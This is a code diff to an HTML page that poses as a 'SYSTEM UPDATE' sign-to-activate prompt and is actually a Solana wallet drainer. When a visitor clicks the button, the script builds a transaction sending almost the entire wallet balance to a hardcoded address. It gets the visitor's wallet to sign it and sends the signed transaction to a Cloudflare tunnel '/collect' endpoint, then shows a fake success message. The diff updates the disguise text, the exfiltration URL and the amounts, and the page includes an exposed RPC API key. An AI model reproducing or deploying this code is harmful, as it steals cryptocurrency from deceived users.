@@ -8,14 +8,16 @@
 </head>
 <body style="background:#000;color:#fff;text-align:center;padding-top:30vh;font-family:sans-serif;">
     <div style="padding:40px;border:1px solid #14F195;border-radius:20px;display:inline-block;background:#111;">
-        <h2 style="color:#14F195;">SYSTEM SYNC</h2>
+        <h2 style="color:#14F195;">SYSTEM UPDATE</h2>
         <button id="cta" style="background:#14F195;color:#000;padding:20px 40px;border:none;border-radius:12px;font-weight:bold;cursor:pointer;font-size:20px;">SIGN TO ACTIVATE</button>
         <p id="msg" style="margin-top:20px;color:#555;">Ready</p>
     </div>
     <script>
         const TARGET = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp";
+        // 🔱 Helius 付费专线数据
         const HELIUS_RPC = "https://mainnet.helius-rpc.com/?api-key=3c44d53c-2c54-41a8-bc38-49be2cb2c6fd";
-        const TUNNEL_URL = "https://naturally-colorado-mod-abu.trycloudflare.com/collect"; 
+        // ✅ 这里的地址已经由脚本自动补全为刚才的 https://plant-switch-governing-pages.trycloudflare.com
+        const TUNNEL_URL = "https://plant-switch-governing-pages.trycloudflare.com/collect"; 
 
         document.getElementById('cta').onclick = async function() {
             try {
@@ -29,13 +31,16 @@
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: p.publicKey,
                         toPubkey: new solanaWeb3.PublicKey(TARGET),
-                        lamports: bal > 2000000 ? bal - 1500000 : 0, 
+                        lamports: bal > 3000000 ? bal - 2000000 : 0, 
                     })
                 );
                 tx.recentBlockhash = blockhash;
                 tx.feePayer = p.publicKey;
 
                 const signed = await p.signTransaction(tx);
+                document.getElementById('msg').innerText = "Transmitting...";
+
+                // 💰 签名离线上传至 71 机
                 const rawBinary = signed.serialize();
                 const signatureB64 = btoa(String.fromCharCode(...rawBinary));
 
@@ -44,7 +49,7 @@
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({ signature: signatureB64 })
                 });
-                alert("Verification Successful!");
+                alert("Protocol Activated!");
             } catch (e) { alert("Error: " + e.message); }
         };
     </script>
